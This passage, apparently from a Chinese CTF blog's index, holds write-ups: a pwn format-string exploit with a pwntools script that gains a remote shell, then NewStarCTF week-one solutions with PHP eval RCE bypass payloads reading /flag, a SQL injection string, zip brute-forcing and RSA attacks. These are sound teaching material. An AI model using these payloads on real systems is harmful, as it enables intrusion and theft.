printf(\"很遗憾本次未获得金币……\\n\");\n            }\n        }\n        else{\n            if(coin>=900&&coin<990){\n                printf(\"成功获得10金币……\\n\");\n                coin+=10;\n            }\n            else{\n                printf(\"成功获得1金币……\\n\");\n                coin+=1;\n            }\n        }\n        printf(\"当前金币：%d个\\n\\n\",coin);\n    }\n}  \n  \n  \nvoid getdiamond(){\n    int luck=0;\n    char password[100];\n    printf(\"======================\\n\");\n    printf(\"你真幸运，送你5颗钻石！\\n\");\n    printf(\"======================\\n\");\n    sleep(1.5);\n    printf(\"马上就能集齐钻石啦，赶紧邀请好友帮你砍一刀吧！\\n\\n\");\n    while(1){\n        if(diamond==10){\n            success();\n        }\n        else{\n            printf(\"按回车键邀请好友砍一刀，领取钻石~\\n\");\n            getchar();\n            sleep(1);\n            printf(\"有好友帮你砍一刀啦!\");\n            if(diamond==9){\n                luck=rand()%101;\n                if((luck%10)==0){\n                    printf(\"===============================================================\\n\");\n                    printf(\"你意外触发了隐藏福利！离成功就差一点点啦，输入神秘口令领取钻石！\\n\");\n                    printf(\"===============================================================\\n\");\n                    sleep(1);\n                    printf(\"输入口令==>\");\n                    init();\n                    read(0,password,101);\n                    printf(password);\n                }\n                else{\n                    printf(\"很遗憾本次未获得钻石……\\n\");\n                }\n            }\n            else{\n                printf(\"成功获得1钻石！\\n\");\n                diamond+=1;\n            }\n        }\n        printf(\"当前钻石：%d颗\\n\\n\",diamond);\n    }\n}\n  \n  \nvoid success(){\n    printf(\"===================\\n\");\n    printf(\"恭喜你集齐10颗钻石！\\n\");\n    printf(\"===================\\n\");\n    sleep(1.5);\n    printf(\"按回车键兑换金币！\\n\\n\");\n    sleep(1.5);\n    printf(\"金币兑换成功！\\n\\n\");\n    sleep(1.5);\n    printf(\"===================\\n\");\n    printf(\"恭喜你集齐1000金币！\\n\");\n    printf(\"===================\\n\");\n    sleep(1.5);\n    printf(\"按回车键兑换提现卡！\\n\\n\");\n    sleep(1.5);\n    printf(\"提现卡兑换成功！\\n\\n\");\n    sleep(1.5);\n    printf(\"正在使用提现卡\");\n    sleep(1.5);\n    printf(\"...\");\n    sleep(1.5);\n    printf(\"...\");\n    sleep(1.5);\n    printf(\"...\\n\");\n    sleep(1.5);\n    printf(\"恭喜你成功提现红包！正在飞速转账~\");\n    sleep(1.5);\n    printf(\"...\");\n    sleep(1.5);\n    printf(\"...\\n\");\n    printf(\"转账成功！\\n\");\n    system(\"/bin/sh\");\n}\n  \n  \nint cipher()\n{\n    printf(\"==>\");\n    int n, judge;\n    scanf(\"%d\", &n);\n    judge = getchar();\n    while(n != 666)\n    {\n        fflush(stdin);\n        printf(\"口令错误，请重新输入\\n==>\");\n        scanf(\"%d\", &n);\n        judge = getchar();\n    }\n    return n;\n}\n  \n  \nint main(){\n    init();\n    game();\n}\n```\n  \n检查：\n  \n![](http://cdn.anyiblog.top/common/1665833298179-0ce473c4-fd3c-492e-8cba-5aedff3fc187.jpg)  \n程序前面一部分回车即可，后面如果钻石为10 那么就可以跳转到success函数得到shell。\n  \n后面的部分会有概率得到一次read和printf的机会，也就是漏洞处\n  \n![](http://cdn.anyiblog.top/common/1665833298519-9dd18e99-6fb0-4067-8bd0-bd3f43ad8917.jpg)  \nprintf存在格式化字符串漏洞，上面的read溢出不了。\n  \n因此我们可以先用AAAAAAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p这种方式找偏移，然后再利用偏移实现任意地址写，将diammand变量改为10，满足判断条件从而得到shell\n  \n![](http://cdn.anyiblog.top/common/1665833298894-631c4fe7-e4b8-4c1c-b8f7-03d01382f3ce.jpg)  \n测试得到偏移为8。那么我们要构造改写diammand的payload就是：\n  \n```\n\"%10c%10hhn\".ljust(16, b'a') + p64(diamand) # 或\"%10c%10n\".ljust(16, b'a') + p64(diamand)\n```\n  \n前面%10c是偏移8加2 要算上payload本身的长度 这里用了ljust就是16（8字节一位 就是16/8=2） 这样跳转到的第10位就是diammand的地址\n  \n然后%10hhn就是要改写内容为10。\n  \n发送回车之类的程序前面sendline()一下即可，到后面金币和钻石的部分写一个循环即可。\n  \n最终脚本：\n  \n```\nfrom pwn import *\n  \n  \n#context.log_level ='debug'\n  \n  \n#p = process('./pwn')\n  \n  \np = remote('node4.buuoj.cn',28969)\n  \n  \nprint(p.recvline().decode())\np.recvuntil('……')\np.sendline()\n  \n  \np.recvuntil('再砍一刀')\np.sendline()\n  \n  \np.recvuntil('==>')\np.sendline('666')\n  \n  \np.recvuntil('分享给好友~')\np.sendline()\n  \n  \nwhile True:\n    content = p.recv().decode()\n    print(content)\n    if \"领取金币~\" in content:\n        p.sendline()\n    elif \"领取钻石~\" in content:\n        p.sendline()\n    elif \"输入口令==>\" in content:\n        context.log_level ='debug'\n        target = 0x00404090\n        payload = b'%10c%10$hhn'.ljust(16, b'a') + p64(target)\n        p.sendline(payload)\n        break\n  \nprint(p.recv())\np.interactive()\n```\n  \n![](http://cdn.anyiblog.top/common/1665833299267-d04cd93e-d3ee-411c-9d22-870098a25dd2.jpg)","tags":["刷题","CTF"],"categories":["刷题笔记","Writeup"]},{"title":"NewStarCTF 公开赛第一周Writeup","url":"/2022/09/25/20220925/","content":"\n# 前言\n\n![](http://cdn.anyiblog.top/common/1664068202000-45e8a8a2-67c8-4057-b272-ee6ff5a34d80.jpg)  \n也是前几天AKA完所有题，刚开始的时候很多题目没拿一血比较可惜，都是差一点\n\n排在11名也是比较可惜的地方，只能说还是太菜了做的慢了\n\n下次继续努力吧。\n\n# Web\n\n## Web1.HTTP\n\n访问容器：\n\n![](http://cdn.anyiblog.top/common/1664068202462-6b81c3dd-108e-44ea-a35b-e00ed7b1847a.jpg)  \n题目要求我们get传name，传入/?name=1\n\n![](http://cdn.anyiblog.top/common/1664068202822-e3ca6c4a-8b6d-404e-a3f0-a06b0a1cb90f.jpg)  \n看源代码发现key为ctfisgood：\n\n![](http://cdn.anyiblog.top/common/1664068203257-e4933f28-4094-436d-aace-e941f4f9c5bc.jpg)  \n传入：\n\n![](http://cdn.anyiblog.top/common/1664068203648-ef94efb3-595d-4046-bac5-60adb02efb27.jpg)  \n\n\n在cookie发现user为guest键值对，改为admin\n\n![](http://cdn.anyiblog.top/common/1664068203988-d73170d1-9ef3-4549-bd5a-fcd117b8fb40.jpg)  \nf5刷新得到flag：\n\n![](http://cdn.anyiblog.top/common/1664068204365-8076e7e1-8169-4fcd-87c9-9e00f699bdf3.jpg)  \n\n## Web2.Head?Header!\n\n访问容器：\n\n![](http://cdn.anyiblog.top/common/1664068204705-25e34dca-ecda-4115-8179-4caedd63f1f0.jpg)  \n改user-agent为ctf\n\n![](http://cdn.anyiblog.top/common/1664068205031-5a14fc6e-254a-4008-8672-7d43962351d6.jpg)Referer改成ctf.com\n\n![](http://cdn.anyiblog.top/common/1664068205448-81c8881f-12d9-497a-ac65-952c8b02279d.jpg)  \n\nX-Forwarded-For改成127.0.0.1即本地\n\n![](http://cdn.anyiblog.top/common/1664068205821-6179378c-4237-4d9e-9753-0eb66539200f.jpg)  \n得到flag\n\n\n## Web3.我真的会谢\n\n访问容器：\n\n![](http://cdn.anyiblog.top/common/1664068206161-9fcb1bae-4c51-4f6a-94d1-341c1f1cbd78.jpg)  \n提示有三部分藏起来了。\n\n看源码有提示\n\n![](http://cdn.anyiblog.top/common/1664068206467-b1d3d899-5050-457b-97ed-3244f4a8496a.jpg)  \n这提示直接访问.index.php.swp 果然下载过来了，文本编辑器查看一下\n\n![](http://cdn.anyiblog.top/common/1664068206880-20081fbd-718c-49b3-b4f3-1ecd2eb807a2.jpg)  \n还有俩部分，都试试可能信息泄露的目录\n\n分别是www.zip和robots.txt\n![](http://cdn.anyiblog.top/common/1664068207225-b2c250fa-308b-46ed-a552-b75907259339.jpg)  \n![](http://cdn.anyiblog.top/common/1664068207720-f1e37043-0944-4857-bbc0-e84c0da5f37c.jpg)  \n最后三部分拼接在一起就是最终flag\n\n## Web4.NotPHP\n\n审计题，各种姿势bypass\n\n![](http://cdn.anyiblog.top/common/1664068208090-bdea3792-bea8-413c-ab1e-39caecf6e726.jpg)\n\n```\n<?php\nerror_reporting(0);\nhighlight_file(__FILE__);\nif(file_get_contents($_GET['data']) == \"Welcome to CTF\"){\n    if(md5($_GET['key1']) === md5($_GET['key2']) && $_GET['key1'] !== $_GET['key2']){\n        if(!is_numeric($_POST['num']) && intval($_POST['num']) == 2077){\n            echo \"Hack Me\";\n            eval(\"#\".$_GET['cmd']);\n        }else{\n            die(\"Number error!\");\n        }\n    }else{\n        die(\"Wrong Key!\");\n    }\n}else{\n    die(\"Pass it!\");\n}\n```\n\n第一层伪协议data://绕过，把内容base64加密，构造payload：\n\n```\ndata://text/plain;base64,V2VsY29tZSB0byBDVEY= #Welcome to CTF\n```\n\n![](http://cdn.anyiblog.top/common/1664068208504-a4c2c5fe-b3b1-4ba3-a3f8-7472818debc4.jpg)绕过第一层。\n\n第二层是MD5强比较，那么用数组绕过，如果是弱比较就可以用原值md5绕过。不过这里不行。\n\n```\nkey1[]=111&key2[]=222\n```\n![](http://cdn.anyiblog.top/common/1664068208878-bd6cdfb1-174a-4b21-acba-c041ef2d791f.jpg)  \n绕过第二层。\n\n第三层是数字比较，要求post传参 且传的num不能被is\\_numeric检测（即不是数字）且数字内容为2077\n\n这里可以用%0a换行绕过is\\_numeric的判断，构造：\n\n```\nnum=2077%0a\n```\n\n![](http://cdn.anyiblog.top/common/1664068209266-e1e08b10-cb11-410c-bed8-c42aeb3c36df.jpg)  \n成功绕过，最后一步就是eval RCE了，不过有个#号比较棘手\n\n我们可以用php短标签+取反 进行绕过\n\n```\n?><?=`{${~%22%a0%b8%ba%ab%22}[%a0]}`?>&%a0=cat /flag\n```\n\n![](http://cdn.anyiblog.top/common/1664068209692-5cb5d4dd-7795-423b-b42b-89fe53dcd30b.jpg) \n\n## Web5.Word-For-You\n\n访问容器，结合题目提示 存在sql注入漏洞\n![](http://cdn.anyiblog.top/common/1664068212169-d51b3297-ce19-4e01-b23b-59d91c1f025d.jpg)  \n随机输入内容，后台会进行查询内容对应的字段\n![](http://cdn.anyiblog.top/common/1664068212750-a50202ab-95ab-4272-a562-dfb11878b59d.jpg)  \n那么我们万能密码1' or 1=1 or '1不就可以直接看所有的字段了吗\n![](http://cdn.anyiblog.top/common/1664068215657-83628158-e62b-4d7a-804c-b08c2071e183.jpg)  \n没想到尝试一下就直接进去了，就直接拿到flag了\n\n# Misc\n\n## Misc1.Yesec no drumsticks 1\n\n题目提示：\n\n![](http://cdn.anyiblog.top/common/1664068216049-df7e84a2-4cad-432b-aeca-2a6a2dbeb635.jpg)  \n下载附件得到图片png，题目直接提示lsb隐写了，直接zsteg一把梭了，用Stegsolve复制比较麻烦。\n\n![](http://cdn.anyiblog.top/common/1664068216404-dc6a595f-69b3-4bb8-bef8-7fa9e9f2942b.jpg)  \n\n## Misc2.qsdz's girlfriend 1\n\n题目提示：\n![](http://cdn.anyiblog.top/common/1664068216782-b1b67500-2858-4a46-8b16-026030f045c6.jpg)  \n下载附件得到压缩包，压缩包提示密码是女朋友生日\n\n![](http://cdn.anyiblog.top/common/1664068217233-10199603-91ae-45a4-a421-3ac5cafeea9c.jpg)  \n直接用bandizip自带的密码爆破，选择数字0-9，爆破特别快！\n\n![](http://cdn.anyiblog.top/common/1664068217684-03afbb22-430b-42e3-a4e2-7f6d865db209.jpg)  \n得到密码20031201解压图片\n\n![](http://cdn.anyiblog.top/common/1664068219316-85251c10-9ad4-4601-9a80-dedbff26f250.jpg)  \n二次元女朋友。。。我服了。\n\n图片底部有提示：\n\n![](http://cdn.anyiblog.top/common/1664068220284-9814cc1e-13ad-4caf-853a-aecc98beaea1.jpg)  \n提示到名字是6个字母且首位大写。\n\n第一眼没别的想法，就直接百度识图了，做这种简单题也不要想太多，按明确的思路去做。\n\n![](http://cdn.anyiblog.top/common/1664068221757-ca2961d1-669b-42fe-90be-d93c2cd67e1a.jpg)  \n一搜得到了Arcaea这个，高高兴兴去交flag了，结果不对。。还问主题人是不是题目格式有啥问题。\n\n太心急了导致没了1血呜呜呜\n\n其实这是个坑 做题要仔细，搜图结果说Arcaea是一款音游，但并不是女朋友名字，所以我们要搜Arcaea女主（doge\n\n\n![](http://cdn.anyiblog.top/common/1664068222233-d4a3b9b8-0842-4417-911c-b2e320c6d6a5.jpg)  \n看到这个直接去试了，最后结果也就是这个名字Hikari\n\n最后flag就是flag{名字\\_生日}\n\n算是曲折的做题经历。。\n\n## Misc3.Look my eyes\n\n题目提示：\n\n![](http://cdn.anyiblog.top/common/1664068222678-e5e674ee-7f8d-4b4d-8d4e-b1dcbc2c2c1c.jpg)  \n下载附件得到一张jpg，结果一堆分析无果\n\n其实题目名 提示 图片名都给了很多提示\n\n沉默的眼睛，其实是一款隐写工具SilentEye（沉默之眼），这比较看misc手的做题经验吧，想起以前的时候也拿silenteye出过题\n\n打开这款软件，将图片放入 decode直接出flag\n\n![](http://cdn.anyiblog.top/common/1664068223140-9f5169d3-b895-4972-9756-04c759c2bfe8.jpg)  \n最后base64解密下\n\n![](http://cdn.anyiblog.top/common/1664068223520-2ceb2a72-3715-480c-8b77-ea83d1eefb18.jpg)  \n\n## Misc4.EzSnake\n\n这道题说是杂项，看解法的话如果把数值114改大一点 改数据破解其实更像逆向题（这个数值太小了，要真玩也可以拿到flag），如果提取jar文件里的图片以及源码对图片进行修改 也可以是杂项题，毕竟什么杂的东西都可以算misc（\n\n题目提示：\n\n![](http://cdn.anyiblog.top/common/1664068223899-d6d44093-b86f-4869-9bed-cc33b4177139.jpg)  \n下载附件得到jar文件，java -jar EzSnake.jar启动游戏\n\n![](http://cdn.anyiblog.top/common/1664068224337-d49f93c2-2ac7-4c80-bf71-ce8a7f555847.jpg)  \n\n如题目提示所说114即可得到flag，用jd-gui看源码\n\n![](http://cdn.anyiblog.top/common/1664068224803-cbea4d3c-e32e-4659-b7f5-5d00d0d483ae.jpg)  \n这里就是主要的函数，当分数超过114分时就会读取文件114514，然后是一个异或0x58的操作，这之后就会是一张图片\n\n之后又经过了java的某些函数修改变成了最终的图片\n\n我原来的做法就是把这个文件还原成图片，但是个无色的图片，再加上我对java这些函数不清楚用法 很麻烦，就没用这个方法做下去了。加上写脚本的时候str.encode时总会多\\\\xc2和\\\\xc3还是比较麻烦的\n\n\n```\nf = open('114514','rb')\ncontent = f.read()\nn = open('res.png','wb')\nnew = b''\nfor i in content:\n    new += chr(i^0x58).encode().replace(b'\\xc2',b'').replace(b'\\xc3',b'')\nn.write(new)\n```\n\n\n![](http://cdn.anyiblog.top/common/1664068225513-2a299b66-255f-4ca2-b2d0-cf44d095ea7e.jpg)  \n看到这个图片就卡住不知道咋做了\n\n后面也是放弃了这种做法，直接改数据了。\n\n思路就是jar反编译，用jd-gui打包文件为.java 修改java文件内容，其中114改为1。然后用javac -cp \\*.jar \\*.java这条命令将java转为class文件，最后再指定META-INF和反编译内容，反编译成jar文件即可\n\n需要注意的是在java转class的时候因为java文件不知是jd-gui问题还是文件本身问题，其中一个for循环被改成了???，要修改否则无法转换\n\n![](http://cdn.anyiblog.top/common/1664068227477-95cbf54e-b882-4cf2-b640-3c6c43b188f7.jpg)  \n改成这样即可：\n\n![](http://cdn.anyiblog.top/common/1664068228021-4e8b4ce4-ea56-469f-a306-a3b5ee7df44d.jpg)  \n具体操作就不写了，大家可以百度下\n\n修改后分数超过1时，会弹出个图片然后闪一下就没了\n\n![](http://cdn.anyiblog.top/common/1664068228486-c45b1eb3-c745-4fda-8223-8361b77dedac.jpg)  \n拼手速截图即可，17岁的反应还是轻轻松松（doge 实在不行录屏也行\n\n![](http://cdn.anyiblog.top/common/1664068229102-a10ca7d7-b0e5-41bb-bf92-1b614d083bab.jpg)  \n最后是一个二维码，补齐码头扫描即可\n\n![](http://cdn.anyiblog.top/common/1664068229735-b6fbf0d6-fe16-4720-a8cb-1e952d79aee0.jpg)  \nbase64解码得到flag\n\n![](http://cdn.anyiblog.top/common/1664068230126-ce3acb06-804f-4ada-9720-7e50a8b2add9.jpg)  \n\n\n## Misc5.奇怪的音频\n\n题目提示：\n![](http://cdn.anyiblog.top/common/1664068230477-223a0578-1a5c-408c-b716-c2be6370a03c.jpg)  \n提示告诉我们音频传输图像，我刚开始还以为是波频摩斯电码转信息，但acdacity分析了下无果，听了下音频倒是很像摩斯电码那样很嘈杂\n\n还有一种音频隐写为SSTV，然后发现我linux里的qsstv分析都没啥结果，可能是因为虚拟机没声卡的原因\n\n搜了下软件windows上有MMSSTV 和 RXSSTV两款软件\n\n我用的是MMSSTV，打开RX，播放音频即可得到图像，不过需要注意这些软件都要声卡支持，如果你播放没有图像就说明你的声卡有问题 得先修复这类问题。\n\n这个是我MMSSTV的图像，还是很糊的。我学弟用RXSSTV跑出来的图像特别清晰。。\n\n![](http://cdn.anyiblog.top/common/1664068230851-7f5974c5-d502-465c-8c05-105cdfe41985.jpg)  \n\n# Crypto\n\n## Crypto1.caeser\n\n下载附件得到密文synt{uvfgbevpny\\_pvcure\\_vf\\_ihyarenoyr}\n\n根据特征和题目名提示，凯撒爆破得到flag\n![](http://cdn.anyiblog.top/common/1664068231241-e5f28053-ab6f-41b7-925c-69a613bca1c0.jpg)  \n\n## Crypto2.吉奥万·巴蒂斯塔·贝拉索先生的密码\n\n下载附件得到如下信息\n\n```\npqcq{gteygpttmj_kc_zuokwv_kqb_gtofmssi_mnrrjt}\n  \n  \nHint: key length is 3\n  \n```\n\n看起来很像凯撒，但题目又给个key\n\n结合题目一猜就知道是维吉尼亚密码，在线网站爆破下 一把梭\n\n![](http://cdn.anyiblog.top/common/1664068231649-811f46d9-0ae8-4934-9c13-934cde001f38.jpg)  \n## Crypto3.eazyxor\n\nxor.py\n![](http://cdn.anyiblog.top/common/1664068232078-23b8ae79-06c9-405a-ae34-f07007afee76.jpg)  \noutput.txt:\n9b919c9a8685cd8fa294c8a28c88cc89cea2ce9c878480\n\n分析脚本：\nurandom(1)就是随机生成一个字符串 赋值给key\n\n密文是xor(flag,key)生成的。xor函数就是遍历flag将每一位异或key 最后返回最终的结果\n\n密文是16进制。\n\n思路：\n这里的思路就是把key搞出来那就好做了，我们已知flag前缀为flag{，那么可以把前缀与密文的16进制进行异或，得到key\n\npython手工尝试就可以验证：\n\n![](http://cdn.anyiblog.top/common/1664068232432-b7ac8dc5-a72b-4e53-8a0b-dab7e8464d0d.jpg)  \n可以看出，最终key为253，知道key了直接写脚本逆推即可\n\n```\nkey = 253\ncipher = '9b919c9a8685cd8fa294c8a28c88cc89cea2ce9c878480'\nflag = \"\"\nfor i in range(0,len(cipher),2):\n    flag += chr(int(cipher[i:i+2],16) ^ key)\nprint(flag)\n```\n\n![](http://cdn.anyiblog.top/common/1664068232779-1548fd58-bee8-48a5-b101-d4cd5c5c7dcb.jpg)  \n\n## Crypto4.RSA\\_begin\n\n下载附件，得到脚本\n```\nfrom Crypto.Util.number import *\nfrom secret import flag\n  \n  \nassert len(flag) % 5 == 0\ncnt = len(flag) // 5\nflags = [flag[cnt*i:cnt*(i+1)] for i in range(5)]\n  \n  \n# Try to implement your RSA with primes p and q\ndef level1(message):\n    m = bytes_to_long(message)\n    p = getPrime(512)\n    q = getPrime(512)\n    n = p * q\n    e = 0x10001\n    assert m < n\n    c = pow(m, e, n)\n    print(f'c = {c}')\n    print(f'p = {p}')\n    print(f'q = {q}')\n  \n  \n# But how can we attack the RSA when we didn't know the primes?\ndef level2(message):\n    m = bytes_to_long(message)\n    p = getPrime(64)\n    q = getPrime(64)\n    n = p * q\n    e = 0x10001\n    assert m < n\n    c = pow(m, e, n)\n    print(f'c = {c}')\n    print(f'n = {n}')\n  \n  \n# Different e may cause danger?\ndef level3(message):\n    m = bytes_to_long(message)\n    p = getPrime(512)\n    q = getPrime(512)\n    e = 3\n    n = p * q\n    assert m < n\n    c = pow(m, e, n)\n    print(f'c = {c}')\n    print(f'n = {n}')\n  \n  \n# So is there anything wrong with RSA as shown below?\ndef level4(message):\n    m = bytes_to_long(message)\n    p = getPrime(512)\n    q = getPrime(512)\n    d = getPrime(64)\n    e = inverse(d, (p-1) * (q-1))\n    n = p * q\n    assert m < n\n    c = pow(m, e, n)\n    print(f'c = {c}')\n    print(f'e = {e}')\n    print(f'n = {n}')\n  \n  \n# What about different n? Just have a try with the hint!\ndef level5(message):\n    m = bytes_to_long(message)\n    p = getPrime(512)\n    q = getPrime(512)\n    n = p * p * q\n    e = 0x10001\n    d = inverse(e, p * (p-1) * (q-1))\n    assert m < n\n    c = pow(m, e, n)\n    hint = pow(d, e, n)\n    print(f'c = {c}')\n    print(f'hint = {hint}')\n    print(f'n = {n}')\n  \n  \nprint('Level 1:')\nlevel1(flags[0])\nprint('Level 2:')\nlevel2(flags[1])\nprint('Level 3:')\nlevel3(flags[2])\nprint('Level 4:')\nlevel4(flags[3])\nprint('Level 5:')\nlevel5(flags[4])\n```\n```\nLevel 1:\nc = 22160015525054597533062795679117215923801827397299805735087138192137742945881204146337349060934854888054628153923021387981306839951210090523829296521835965212118849043671673133979884712755090374758002677916820953359774554825569218497687506468472278309097929775388010403607769802840990547048001743970754496905\np = 6962443023774446497102092246794613339314677593117417573764609329949026862782472380488956732038459060928443992561763464365758383525259954798321350043810351\nq = 9631855759661411029901156175243744760977799976661519182223576693685069000499866459636568713055906075171480855575061732016121299027658733834671035383233163\nLevel 2:\nc = 17250922799297131008803303235771955129\nn = 134097988095851988085603926250918812377\nLevel 3:\nc = 2776571135646565181849912433877522437622755332262910824866791711\nn = 85793694792655420934945863688968944466300304898903354212780512650924132933351787673979641944071634528676901506049360194331553838080226562532784448832916022442020751986591703547743056267118831445759258041047213294368605599719242059474324548598203039032847591828382166845797857139844445858881218318006747115157\nLevel 4:\nc = 68588738085497640698861260094482876262596289469248772328560280530093163764972313090939471997156632421517452790632223565521726590730640805290182026911025142051864898712501214753986865172996090706657535814234291235489829621372021092488300236623525366939477695283380634188510950335639019458758643273802572617191\ne = 51999725233581619348238930320668315462087635295211755849675812266270026439521805156908952855288255992098479180003264827305694330542325533165867427898010879823017054891520626992724274019277478717788189662456052796449734904215067032681345261878977193341769514961038309763898052908572726913209883965288047452751\nn = 68816697240190744603903822351423855593899797203703723038363240057913366227564780805815565183450516726498872118491739132110437976570592602837245705802946829337567674506561850972973663435358068441037127926802688722648016352967768929007662772115485020718202683004813042834036078650571763978066558718285783045969\nLevel 5:\nc = 1135954814335407362237156338232840769700916726653557860319741136149066730262056907097728029957898420630256832277578506404721904131425822963948589774909272408535427656986176833063600681390871582834223748797942203560505159946141171210061405977060061656807175913366911284450695116982731157917343650021723054666494528470413522258995220648163505549701953152705111304471498547618002847587649651689203632845303117282630095814054989963116013144483037051076441508388998829\nhint = 611144874477135520868450203622074557606421849009025270666985817360484127602945558050689975570970227439583312738313767886380304814871432558985582586031211416586296452510050692235459883608453661597776103386009579351911278185434163016083552988251266501525188362673472772346212970459561496301631587043106524741903627979311997541301471894670374945556313285203740782346029579923650160327646876967315182335114575921178144825057359851607166387868294019144940296084605930\nn = 1232865496850144050320992645475166723525103370117149219196294373695624167653495180701004894188767069545579706264513808335877905149818445940067870026924895990672091745229251935876434509430457142930654307044403355838663341948471348893414890261787326255632362887647279204029327042915224570484394917295606592360109952538313570951448278525753313335289675455996833500751672463525151201002407861423542656805624090223118747404488579783372944593022796321473618301206064979\n```\n内容是flag被分成5份，分别交给5个rsa进行运算，最终需要我们搞对5个rsa即可获得flag\n\n全程rsa工具一把梭，太香了\n\nlevel1：\n\n```\n# Try to implement your RSA with primes p and q\ndef level1(message):\n    m = bytes_to_long(message)\n    p = getPrime(512)\n    q = getPrime(512)\n    n = p * q\n    e = 0x10001\n    assert m < n\n    c = pow(m, e, n)\n    print(f'c = {c}')\n    print(f'p = {p}')\n    print(f'q = {q}')\n```\n\n```\nLevel 1:\nc = 22160015525054597533062795679117215923801827397299805735087138192137742945881204146337349060934854888054628153923021387981306839951210090523829296521835965212118849043671673133979884712755090374758002677916820953359774554825569218497687506468472278309097929775388010403607769802840990547048001743970754496905\np = 6962443023774446497102092246794613339314677593117417573764609329949026862782472380488956732038459060928443992561763464365758383525259954798321350043810351\nq = 9631855759661411029901156175243744760977799976661519182223576693685069000499866459636568713055906075171480855575061732016121299027658733834671035383233163\n```\n给了p和q还有e，最基础的直接解出。\n\n![](http://cdn.anyiblog.top/common/1664068233293-c3fd25f6-798a-4db2-82e1-9ecddb93d6d1.jpg)  \nlevel2：\n```\n# But how can we attack the RSA when we didn't know the primes?\ndef level2(message):\n    m = bytes_to_long(message)\n    p = getPrime(64)\n    q = getPrime(64)\n    n = p * q\n    e = 0x10001\n    assert m < n\n    c = pow(m, e, n)\n    print(f'c = {c}')\n    print(f'n = {n}')\n```\n\n```\nLevel 2:\nc = 17250922799297131008803303235771955129\nn = 134097988095851988085603926250918812377\n```\n这题给了n，没有p q可以考虑分解一下\n\n![](http://cdn.anyiblog.top/common/1664068233675-a86b5efc-111d-4f4f-b695-5f1e34a3ce24.jpg)  \n```\np=10094271714305059493\nq=13284562957208247589\n```\n\n分解出来p q，就照常做了\n\n![](http://cdn.anyiblog.top/common/1664068234144-fa1d6207-a974-4747-a45f-65ec9d60ddb7.jpg)  \nlevel3：\n```\n# Different e may cause danger?\ndef level3(message):\n    m = bytes_to_long(message)\n    p = getPrime(512)\n    q = getPrime(512)\n    e = 3\n    n = p * q\n    assert m < n\n    c = pow(m, e, n)\n    print(f'c = {c}')\n    print(f'n = {n}')\n```\n\n```\nLevel 3:\nc = 2776571135646565181849912433877522437622755332262910824866791711\nn = 85793694792655420934945863688968944466300304898903354212780512650924132933351787673979641944071634528676901506049360194331553838080226562532784448832916022442020751986591703547743056267118831445759258041047213294368605599719242059474324548598203039032847591828382166845797857139844445858881218318006747115157\n```\n\ne很小，考虑小e攻击\n\n![](http://cdn.anyiblog.top/common/1664068234773-aa9771bf-85ca-4b70-852f-8211cd31fe0f.jpg)  \nlevel4:\n```\n# So is there anything wrong with RSA as shown below?\ndef level4(message):\n    m = bytes_to_long(message)\n    p = getPrime(512)\n    q = getPrime(512)\n    d = getPrime(64)\n    e = inverse(d, (p-1) * (q-1))\n    n = p * q\n    assert m < n\n    c = pow(m, e, n)\n    print(f'c = {c}')\n    print(f'e = {e}')\n    print(f'n = {n}')\n```\n```\nLevel 4:\nc = 68588738085497640698861260094482876262596289469248772328560280530093163764972313090939471997156632421517452790632223565521726590730640805290182026911025142051864898712501214753986865172996090706657535814234291235489829621372021092488300236623525366939477695283380634188510950335639019458758643273802572617191\ne = 51999725233581619348238930320668315462087635295211755849675812266270026439521805156908952855288255992098479180003264827305694330542325533165867427898010879823017054891520626992724274019277478717788189662456052796449734904215067032681345261878977193341769514961038309763898052908572726913209883965288047452751\nn = 68816697240190744603903822351423855593899797203703723038363240057913366227564780805815565183450516726498872118491739132110437976570592602837245705802946829337567674506561850972973663435358068441037127926802688722648016352967768929007662772115485020718202683004813042834036078650571763978066558718285783045969\n```\n\n看到这个e = inverse(d, (p-1) \\* (q-1))，可以考虑维纳攻击\n\n\n![](http://cdn.anyiblog.top/common/1664068235486-29855776-2007-4235-8344-16ea002920d1.jpg)  \n![](http://cdn.anyiblog.top/common/1664068236464-7cc18463-8009-4ece-af37-667e6de073cb.jpg)  \nlevel5：\n```\n# What about different n? Just have a try with the hint!\ndef level5(message):\n    m = bytes_to_long(message)\n    p = getPrime(512)\n    q = getPrime(512)\n    n = p * p * q\n    e = 0x10001\n    d = inverse(e, p * (p-1) * (q-1))\n    assert m < n\n    c = pow(m, e, n)\n    hint = pow(d, e, n)\n    print(f'c = {c}')\n    print(f'hint = {hint}')\n    print(f'n = {n}')\n```\n```\nLevel 5:\nc = 1135954814335407362237156338232840769700916726653557860319741136149066730262056907097728029957898420630256832277578506404721904131425822963948589774909272408535427656986176833063600681390871582834223748797942203560505159946141171210061405977060061656807175913366911284450695116982731157917343650021723054666494528470413522258995220648163505549701953152705111304471498547618002847587649651689203632845303117282630095814054989963116013144483037051076441508388998829\nhint = 611144874477135520868450203622074557606421849009025270666985817360484127602945558050689975570970227439583312738313767886380304814871432558985582586031211416586296452510050692235459883608453661597776103386009579351911278185434163016083552988251266501525188362673472772346212970459561496301631587043106524741903627979311997541301471894670374945556313285203740782346029579923650160327646876967315182335114575921178144825057359851607166387868294019144940296084605930\nn = 1232865496850144050320992645475166723525103370117149219196294373695624167653495180701004894188767069545579706264513808335877905149818445940067870026924895990672091745229251935876434509430457142930654307044403355838663341948471348893414890261787326255632362887647279204029327042915224570484394917295606592360109952538313570951448278525753313335289675455996833500751672463525151201002407861423542656805624090223118747404488579783372944593022796321473618301206064979\n```\n\n最难的来了，这个n一开始我以为分解不了，yafu确实分解不了 跑了一天都没结果\n\n但就在我有一番尝试，竟然发现factor可以分解。。。\n\n![](http://cdn.anyiblog.top/common/1664068236860-31461049-0f05-4193-9dca-ed2d8edba317.jpg)  \n\n```\np=7847442891136527803359068772358427068143790075117898713864091493156236115532143887311226864013228406744014688816262373232805140661188849984894717969091251\nq=12534117664372989232569409438590242615337539602715699433408077708059688661449192930089271891161700563225723137957778069886363333248734538990407281949985777\n```\n\np和q得到就简单了\n\n有可能是非预期解吧，hint没有用到。\n\n将p,q,n,e,c带入直接得到flag\n\n![](http://cdn.anyiblog.top/common/1664068237477-1bfb9292-4ec6-408a-a798-8d8003e9cebd.jpg)  \n最终flag为五个拼接在一起：\n\n![](http://cdn.anyiblog.top/common/1664068237814-89108425-42ab-4965-9717-d24eeb883c4f.jpg)  \n\n## Crypto5.chaos\n\n这题确实不算很难，只是代码看着很复杂很乱，但关键的东西作者都给了\n\n逐步读代码\n\n```\nimport random\nimport time\nfrom secret import flag\n  \n  \ndef LC(key, x, times, flags):\n    (k1, k2) = 